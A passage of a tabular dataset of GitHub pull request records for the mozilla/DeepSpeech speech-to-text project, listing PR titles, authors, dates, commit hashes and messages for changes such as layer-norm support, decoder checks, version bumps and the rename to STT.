Replacing old sha references ('4336a5b49fa6d650e24dbdba55bcef9581535244') with the new one ('23ad988fcde60fb01f9533e95004bbc4877a9143')"
577,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3276,3276,Pr3256,,lissyx,1645737,2020-08-24T18:22:23Z,COLLABORATOR,True,34,29,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8284958f3d8f99dac9ebf65e965e71f5af22ef04,Updating tensorflow version in taskcluster/.build.yml
578,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3274,3274,Pr3256,,lissyx,1645737,2020-08-24T17:41:25Z,COLLABORATOR,False,12,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,454ffc02b1e73cc8e4a9687ea673a321743b7a97,Implementation of layer-norm in the training script
579,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3274,3274,Pr3256,,lissyx,1645737,2020-08-24T17:41:25Z,COLLABORATOR,False,12,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3409a3a9d0f699612a7643ae90c7e51673c52caf,Default for layer_norm set to False
580,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3274,3274,Pr3256,,lissyx,1645737,2020-08-24T17:41:25Z,COLLABORATOR,False,12,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e86ef6b930ee759848062a7c9a1c3c1bcee6f2b,Changing .gitmodules to github.com/bernardohenz/tensorflow.git
581,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3274,3274,Pr3256,,lissyx,1645737,2020-08-24T17:41:25Z,COLLABORATOR,False,12,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12479e212235465d73b32ba8a58d75989e3ca2e6,Updating commit of submodule
582,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3272,3272,"In ctc_beam_search_decoder(), added a sanity check between input class_dim and alphabet","I have encountered a case where my alphabet file was wrong (one extra letter in it), and it resulted in issues difficult to debug. So, I suggest to add a check there.",godefv,18540039,2020-08-24T06:38:59Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,95b6fccaf1ce24e41058eceb55a4b7a9885cc2c6,"In ctc_beam_search_decoder(), added a sanity check between input class_dim and alphabet"
583,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3268,3268,Fix lr initialization on reload,"This fixes a problem if someone uses the `force_initialize_learning_rate` flag. 
In the current implementation we reset the learning rate to the old one in this case and the LR-reduction we did before has no effect.",DanBmh,18572490,2020-08-21T14:51:19Z,CONTRIBUTOR,False,17,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4eca5b23be1ed78bcc2a277edccd1c4e39aaa40f,Fix lr initialization on reload.
584,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3267,3267,Add ElectronJS v9.2,,lissyx,1645737,2020-08-20T09:17:30Z,COLLABORATOR,True,111,8,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba6c68d435d882578147bd9b9545fadeea7af463,Add ElectronJS v9.2
585,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3266,3266,Add ElectronJS v9.2,,lissyx,1645737,2020-08-20T09:16:15Z,COLLABORATOR,True,111,8,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4283b7e7def4f01035b55ff1b6c52cbd10f8610d,Add ElectronJS v9.2
586,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3265,3265,Update client.py,remove space in key start_time of word dict,lissyx,1645737,2020-08-20T08:08:24Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a920e95a448a67ac9fdb09fdc1b8ec48b8459472,"Update client.py

remove space in key start_time of word dict"
587,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3264,3264,Update client.py,remove space in key start_time of word dict,ptitloup,4640002,2020-08-20T07:23:30Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c3aa6f4729cd5503731fec0b37b937d72ee234e,"Update client.py

remove space in key start_time of word dict"
588,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3262,3262,Use more beefy builder for Docker builds,,lissyx,1645737,2020-08-19T15:28:08Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5cc1ec32bdb9383c16f0051dfb6754a1a76c8ac1,Use more beefy builder for Docker builds
589,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3261,3261,Tests #3245 Reload weights after plateau,,reuben,477142,2020-08-19T15:25:10Z,MEMBER,True,9,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09e142227854d758ccfbcb39b60425a818797808,Reload weights after plateau.
590,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3261,3261,Tests #3245 Reload weights after plateau,,reuben,477142,2020-08-19T15:25:10Z,MEMBER,True,9,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4cf7a012a315d8f98d34aad455e1077db1bb593a,Don't drop layers in rlrop reload.
591,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3261,3261,Tests #3245 Reload weights after plateau,,reuben,477142,2020-08-19T15:25:10Z,MEMBER,True,9,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,420ba808c8daf93ee0806191c58aa3a300a18b8f,Reload graph with extra function.
592,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3260,3260,[r0.8] Explicitly set minimum macOS version in bazel flags,,reuben,477142,2020-08-19T14:43:02Z,MEMBER,True,6,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0c327a367bf0fb47c51f7b1bb9f8e5d9a4a0a3b,Explicitly set minimum macOS version in bazel flags
593,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3259,3259,Explicitly set minimum macOS version in bazel flags,,reuben,477142,2020-08-19T12:18:06Z,MEMBER,True,6,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2bceda0c566149ff8e884b395b47bbf1fb1ef4d9,Explicitly set minimum macOS version in bazel flags
594,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3258,3258,Extend docu about the CSV files,Adds the detailed information about the expected CSV files structure.,Jendker,14967831,2020-08-19T09:29:22Z,CONTRIBUTOR,True,5,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a6a1c7f3ad438b4b06b8910a4dee53942d57c96,Extend docu about the CSV files
595,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3256,3256,Implementation of layer-norm in the training script,"PR that allows the use of layer-norm in the model. For our experiments, it allows for training more epochs without overfitting.

PS: I'll be creating a PR in you tensorflow repository, as layer-norm uses some dependencies that are not included in your build rule. Nonetheless, I'm sending the new rule here (which were found in ```tensorflow/core/kernels/BUILD```). When compiling in the 0.6.1 version, the following rule worked just fine:
```
tf_kernel_library(
    name = ""deepspeech_cwise_ops"",
    srcs = [
        ""cwise_op_less.cc"",
        ""cwise_op_minimum.cc"",
        ""cwise_op_mul_1.cc"",
        ""cwise_op_squared_difference.cc"",
        ""cwise_op_add_1.cc"",
        ""cwise_op_add_2.cc"",
        ""cwise_op_rsqrt.cc"",
        ""cwise_op_sub.cc"",
    ],
    gpu_srcs = [
        ""cwise_op_gpu_less.cu.cc"",
        ""cwise_op_gpu_minimum.cu.cc"",
        ""cwise_op_gpu_mul.cu.cc"",
        ""cwise_op_gpu_squared_difference.cu.cc"",
        ""cwise_op_gpu_add.cu.cc"",
        ""cwise_op_gpu_rsqrt.cu.cc"",
        ""cwise_op_gpu_sub.cu.cc"",
    ],
    deps = [
        "":cwise_lib"",
        ""//tensorflow/core:framework"",
        ""//tensorflow/core:lib"",
        ""//third_party/eigen3"",
    ],
}
```

I'll be compiling the binaries in the ```master``` to check if it still works.",bernardohenz,810340,2020-08-18T14:58:11Z,COLLABORATOR,False,35,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f75e13f5ec8430ec9907bf6206791d61373b41b,Implementation of layer-norm in the training script
596,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3256,3256,Implementation of layer-norm in the training script,"PR that allows the use of layer-norm in the model. For our experiments, it allows for training more epochs without overfitting.

PS: I'll be creating a PR in you tensorflow repository, as layer-norm uses some dependencies that are not included in your build rule. Nonetheless, I'm sending the new rule here (which were found in ```tensorflow/core/kernels/BUILD```). When compiling in the 0.6.1 version, the following rule worked just fine:
```
tf_kernel_library(
    name = ""deepspeech_cwise_ops"",
    srcs = [
        ""cwise_op_less.cc"",
        ""cwise_op_minimum.cc"",
        ""cwise_op_mul_1.cc"",
        ""cwise_op_squared_difference.cc"",
        ""cwise_op_add_1.cc"",
        ""cwise_op_add_2.cc"",
        ""cwise_op_rsqrt.cc"",
        ""cwise_op_sub.cc"",
    ],
    gpu_srcs = [
        ""cwise_op_gpu_less.cu.cc"",
        ""cwise_op_gpu_minimum.cu.cc"",
        ""cwise_op_gpu_mul.cu.cc"",
        ""cwise_op_gpu_squared_difference.cu.cc"",
        ""cwise_op_gpu_add.cu.cc"",
        ""cwise_op_gpu_rsqrt.cu.cc"",
        ""cwise_op_gpu_sub.cu.cc"",
    ],
    deps = [
        "":cwise_lib"",
        ""//tensorflow/core:framework"",
        ""//tensorflow/core:lib"",
        ""//third_party/eigen3"",
    ],
}
```

I'll be compiling the binaries in the ```master``` to check if it still works.",bernardohenz,810340,2020-08-18T14:58:11Z,COLLABORATOR,False,35,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7253776e19c36539a7f2b13bc77a560655b6a305,Default for layer_norm set to False
597,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3256,3256,Implementation of layer-norm in the training script,"PR that allows the use of layer-norm in the model. For our experiments, it allows for training more epochs without overfitting.

PS: I'll be creating a PR in you tensorflow repository, as layer-norm uses some dependencies that are not included in your build rule. Nonetheless, I'm sending the new rule here (which were found in ```tensorflow/core/kernels/BUILD```). When compiling in the 0.6.1 version, the following rule worked just fine:
```
tf_kernel_library(
    name = ""deepspeech_cwise_ops"",
    srcs = [
        ""cwise_op_less.cc"",
        ""cwise_op_minimum.cc"",
        ""cwise_op_mul_1.cc"",
        ""cwise_op_squared_difference.cc"",
        ""cwise_op_add_1.cc"",
        ""cwise_op_add_2.cc"",
        ""cwise_op_rsqrt.cc"",
        ""cwise_op_sub.cc"",
    ],
    gpu_srcs = [
        ""cwise_op_gpu_less.cu.cc"",
        ""cwise_op_gpu_minimum.cu.cc"",
        ""cwise_op_gpu_mul.cu.cc"",
        ""cwise_op_gpu_squared_difference.cu.cc"",
        ""cwise_op_gpu_add.cu.cc"",
        ""cwise_op_gpu_rsqrt.cu.cc"",
        ""cwise_op_gpu_sub.cu.cc"",
    ],
    deps = [
        "":cwise_lib"",
        ""//tensorflow/core:framework"",
        ""//tensorflow/core:lib"",
        ""//third_party/eigen3"",
    ],
}
```

I'll be compiling the binaries in the ```master``` to check if it still works.",bernardohenz,810340,2020-08-18T14:58:11Z,COLLABORATOR,False,35,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f019e91c2b460321d0fe3fa1b40a2ab1673c46b,Changing .gitmodules to github.com/bernardohenz/tensorflow.git
598,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3256,3256,Implementation of layer-norm in the training script,"PR that allows the use of layer-norm in the model. For our experiments, it allows for training more epochs without overfitting.

PS: I'll be creating a PR in you tensorflow repository, as layer-norm uses some dependencies that are not included in your build rule. Nonetheless, I'm sending the new rule here (which were found in ```tensorflow/core/kernels/BUILD```). When compiling in the 0.6.1 version, the following rule worked just fine:
```
tf_kernel_library(
    name = ""deepspeech_cwise_ops"",
    srcs = [
        ""cwise_op_less.cc"",
        ""cwise_op_minimum.cc"",
        ""cwise_op_mul_1.cc"",
        ""cwise_op_squared_difference.cc"",
        ""cwise_op_add_1.cc"",
        ""cwise_op_add_2.cc"",
        ""cwise_op_rsqrt.cc"",
        ""cwise_op_sub.cc"",
    ],
    gpu_srcs = [
        ""cwise_op_gpu_less.cu.cc"",
        ""cwise_op_gpu_minimum.cu.cc"",
        ""cwise_op_gpu_mul.cu.cc"",
        ""cwise_op_gpu_squared_difference.cu.cc"",
        ""cwise_op_gpu_add.cu.cc"",
        ""cwise_op_gpu_rsqrt.cu.cc"",
        ""cwise_op_gpu_sub.cu.cc"",
    ],
    deps = [
        "":cwise_lib"",
        ""//tensorflow/core:framework"",
        ""//tensorflow/core:lib"",
        ""//third_party/eigen3"",
    ],
}
```

I'll be compiling the binaries in the ```master``` to check if it still works.",bernardohenz,810340,2020-08-18T14:58:11Z,COLLABORATOR,False,35,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cd91087071224a847a07262651855dea41a6b8ba,Updating commit of submodule
599,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3256,3256,Implementation of layer-norm in the training script,"PR that allows the use of layer-norm in the model. For our experiments, it allows for training more epochs without overfitting.

PS: I'll be creating a PR in you tensorflow repository, as layer-norm uses some dependencies that are not included in your build rule. Nonetheless, I'm sending the new rule here (which were found in ```tensorflow/core/kernels/BUILD```). When compiling in the 0.6.1 version, the following rule worked just fine:
```
tf_kernel_library(
    name = ""deepspeech_cwise_ops"",
    srcs = [
        ""cwise_op_less.cc"",
        ""cwise_op_minimum.cc"",
        ""cwise_op_mul_1.cc"",
        ""cwise_op_squared_difference.cc"",
        ""cwise_op_add_1.cc"",
        ""cwise_op_add_2.cc"",
        ""cwise_op_rsqrt.cc"",
        ""cwise_op_sub.cc"",
    ],
    gpu_srcs = [
        ""cwise_op_gpu_less.cu.cc"",
        ""cwise_op_gpu_minimum.cu.cc"",
        ""cwise_op_gpu_mul.cu.cc"",
        ""cwise_op_gpu_squared_difference.cu.cc"",
        ""cwise_op_gpu_add.cu.cc"",
        ""cwise_op_gpu_rsqrt.cu.cc"",
        ""cwise_op_gpu_sub.cu.cc"",
    ],
    deps = [
        "":cwise_lib"",
        ""//tensorflow/core:framework"",
        ""//tensorflow/core:lib"",
        ""//third_party/eigen3"",
    ],
}
```

I'll be compiling the binaries in the ```master``` to check if it still works.",bernardohenz,810340,2020-08-18T14:58:11Z,COLLABORATOR,False,35,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77e6c9347ec17509b05ca6fa5324e035907ae442,"Replacing old sha with new ones

Replacing old sha references ('4336a5b49fa6d650e24dbdba55bcef9581535244') with the new one ('6dc2a1becfd1316eb4d77240133a548e93dbff63')"
600,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3256,3256,Implementation of layer-norm in the training script,"PR that allows the use of layer-norm in the model. For our experiments, it allows for training more epochs without overfitting.

PS: I'll be creating a PR in you tensorflow repository, as layer-norm uses some dependencies that are not included in your build rule. Nonetheless, I'm sending the new rule here (which were found in ```tensorflow/core/kernels/BUILD```). When compiling in the 0.6.1 version, the following rule worked just fine:
```
tf_kernel_library(
    name = ""deepspeech_cwise_ops"",
    srcs = [
        ""cwise_op_less.cc"",
        ""cwise_op_minimum.cc"",
        ""cwise_op_mul_1.cc"",
        ""cwise_op_squared_difference.cc"",
        ""cwise_op_add_1.cc"",
        ""cwise_op_add_2.cc"",
        ""cwise_op_rsqrt.cc"",
        ""cwise_op_sub.cc"",
    ],
    gpu_srcs = [
        ""cwise_op_gpu_less.cu.cc"",
        ""cwise_op_gpu_minimum.cu.cc"",
        ""cwise_op_gpu_mul.cu.cc"",
        ""cwise_op_gpu_squared_difference.cu.cc"",
        ""cwise_op_gpu_add.cu.cc"",
        ""cwise_op_gpu_rsqrt.cu.cc"",
        ""cwise_op_gpu_sub.cu.cc"",
    ],
    deps = [
        "":cwise_lib"",
        ""//tensorflow/core:framework"",
        ""//tensorflow/core:lib"",
        ""//third_party/eigen3"",
    ],
}
```

I'll be compiling the binaries in the ```master``` to check if it still works.",bernardohenz,810340,2020-08-18T14:58:11Z,COLLABORATOR,False,35,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a529b39a60f952f1167232a40c7223a7fbe9fa9b,Updating tensorflow version in taskcluster/.build.yml
601,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3255,3255,Parse the wav_filesize as float,Allows the backward compatibility with the csv files.,Jendker,14967831,2020-08-18T12:28:32Z,CONTRIBUTOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba863fdd276a9060bf63197d06e7a9b82c9ab013,get filesize as float
602,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3254,3254,Bump VERSION to 0.9.0-alpha.7,,lissyx,1645737,2020-08-18T10:28:27Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19ed4e950a803db30a400664f949d11282ccc087,Bump VERSION to 0.9.0-alpha.7
603,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3252,3252,Add num_results param to ctc_beam_search_decoder,,lissyx,1645737,2020-08-17T16:44:24Z,COLLABORATOR,False,23,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c20af74d5113efb85c29876d9d8afe7cc487f2d9,Add num_results param to ctc_beam_search_decoder
604,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3251,3251,Add num_results param to ctc_beam_search_decoder,Allows the specification of number of returned candidates with `ds-ctcdecoder` package.,Jendker,14967831,2020-08-17T16:31:25Z,CONTRIBUTOR,True,23,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c20af74d5113efb85c29876d9d8afe7cc487f2d9,Add num_results param to ctc_beam_search_decoder
605,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3250,3250,Fix SWIG prebuild URL,,lissyx,1645737,2020-08-17T09:56:08Z,COLLABORATOR,True,8,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5089e69b9782c97c67196cfdb51bf1857bf51fe0,Fix SWIG prebuild URL
606,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3250,3250,Fix SWIG prebuild URL,,lissyx,1645737,2020-08-17T09:56:08Z,COLLABORATOR,True,8,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0671a78f5d023cd4d405431ae09cda68b730b631,Hotfix repo rename
607,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3248,3248,Update name of readthedocs,,lissyx,1645737,2020-08-13T20:53:15Z,COLLABORATOR,True,6,6,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fffc6ad455b3e7fd8559957ef7597dd8e960b3a6,Update name of readthedocs
608,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3247,3247,Freeze layers for transfer learning,"Currently when doing transfer learning we reinitialize the uppermost layers randomly. Afterwards training is continuing normally. But this has the problem that gradients are also propagated through the lower layers we would like to keep, and changes them too. 

These changes allow training the reinitialized uppermost layers only. After this you can start a new training, further optimizing the complete network.",DanBmh,18572490,2020-08-13T12:41:49Z,CONTRIBUTOR,False,62,27,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fadaf2a7e3389f205914450e3eab83148258578c,Freeze layers for transfer learning.
609,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3247,3247,Freeze layers for transfer learning,"Currently when doing transfer learning we reinitialize the uppermost layers randomly. Afterwards training is continuing normally. But this has the problem that gradients are also propagated through the lower layers we would like to keep, and changes them too. 

These changes allow training the reinitialized uppermost layers only. After this you can start a new training, further optimizing the complete network.",DanBmh,18572490,2020-08-13T12:41:49Z,CONTRIBUTOR,False,62,27,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0d559712f74301a7c9ea42b0bd4be9850edbcbe,Refactor freezing.
610,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3246,3246,Fix docker path with new project name,,lissyx,1645737,2020-08-12T14:55:26Z,COLLABORATOR,True,18,16,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1ad6ad9708ee7ae1f010d0414d4ea729b681ee98,Fix docker path with new project name
611,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3245,3245,Reload weights after plateau,Reload checkpoint weights after reaching a plateau that we use the best_dev weights again,DanBmh,18572490,2020-08-12T14:52:24Z,CONTRIBUTOR,False,9,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73e33098a9f7d2bc4e50a544fe8f58cec0bf7788,Reload weights after plateau.
612,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3245,3245,Reload weights after plateau,Reload checkpoint weights after reaching a plateau that we use the best_dev weights again,DanBmh,18572490,2020-08-12T14:52:24Z,CONTRIBUTOR,False,9,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a8627176068741e8bfa0f80df3cfb2e1eae198f2,Don't drop layers in rlrop reload.
613,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3245,3245,Reload weights after plateau,Reload checkpoint weights after reaching a plateau that we use the best_dev weights again,DanBmh,18572490,2020-08-12T14:52:24Z,CONTRIBUTOR,False,9,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8b6ca8e60c37e785e210d985d39b74c24a56cf3,Reload graph with extra function.
614,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3244,3244,Bump VERSION to 0.9.0-alpha.6,,lissyx,1645737,2020-08-12T14:22:50Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2838df25e01869a51c3b50dd0e1eba9341363883,Bump VERSION to 0.9.0-alpha.6
615,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3243,3243,Rename DeepSpeech -> STT,,lissyx,1645737,2020-08-12T11:46:47Z,COLLABORATOR,True,584,584,289,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9bca7a90449999aba4550186566c710c71332557,Rename DeepSpeech -> STT
616,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3242,3242,Try and properly cleanup TaskCluster Workdir,,lissyx,1645737,2020-08-12T09:00:02Z,COLLABORATOR,True,7,7,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60fe2450a7a9945b28e0a182f81d278c20b78441,Try and properly cleanup TaskCluster Workdir
617,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3241,3241,Rename ctcdecoder python package,,lissyx,1645737,2020-08-10T20:46:40Z,COLLABORATOR,True,23,23,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ccd9241bd0e26bc372f296f7f3036d9a822039fa,Rename ctcdecoder python package
618,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3240,3240,Bump VERSION to 0.8.1,,lissyx,1645737,2020-08-10T18:32:52Z,COLLABORATOR,True,14,14,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8e7d6cba4fbfca255b0ae49dc17bf673a130948c,Bump VERSION to 0.8.1
619,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3239,3239,Use new name for Docker container and Docker Hub repo,,lissyx,1645737,2020-08-10T18:20:37Z,COLLABORATOR,True,25,25,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e83d92c93a2c040de9ad559ad020e5857768579d,Use new name for Docker container and Docker Hub repo
620,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3238,3238,Rename TaskCluster index,,lissyx,1645737,2020-08-10T17:04:55Z,COLLABORATOR,True,165,137,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5795173c14bd708fd1a1a69b2aaf64f689a39fb2,Rename TaskCluster index
621,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3237,3237,Rename deepspeech_training package,,lissyx,1645737,2020-08-10T14:45:08Z,COLLABORATOR,True,75,75,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f84bd1996d08aa9770b785851b607bcb79e464d,Rename deepspeech_training package
622,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3236,3236,Resolves #3235 - Support for .tar(.gz) targets in bin/data_set_tool.py,,tilmankamp,5991088,2020-08-10T12:27:38Z,CONTRIBUTOR,True,90,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96f37a403d4e469df0647fbee3ba90a94c37ee6c,Resolves #3235 - Support for .tar(.gz) targets in bin/data_set_tool.py
623,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3234,3234,Rename DeepSpeech-examples to STT-examples,,lissyx,1645737,2020-08-10T11:39:10Z,COLLABORATOR,True,7,7,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d989a5175f13661ad74f03cbaadcf4c521d28345,Rename DeepSpeech-examples to STT-examples
624,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3233,3233,Rename DeepSpeech-examples to STT-examples,,lissyx,1645737,2020-08-10T11:37:12Z,COLLABORATOR,True,6,6,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d31f5e349f091d0b6157afcf1281d092f2c6a3b,Rename DeepSpeech-examples to STT-examples
625,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3232,3232,Bump VERSION to 0.9.0-alpha.5,,lissyx,1645737,2020-08-07T09:40:18Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41dcb41691e7045793fe6dd15e877cb5e1b6ed91,Bump VERSION to 0.9.0-alpha.5
626,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3230,3230,Rename NuGet -GPU package to -CUDA,,reuben,477142,2020-08-06T14:18:48Z,MEMBER,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e8213c38558b4b7e0a9c1471419138d3693a332,Rename NuGet -GPU package to -CUDA
627,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3229,3229,Use scoped name for npm package,,reuben,477142,2020-08-06T14:14:55Z,MEMBER,True,14,14,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,50de3779532e719c5d30e4b8943b50e3e50d1f2c,Use scoped name for npm package
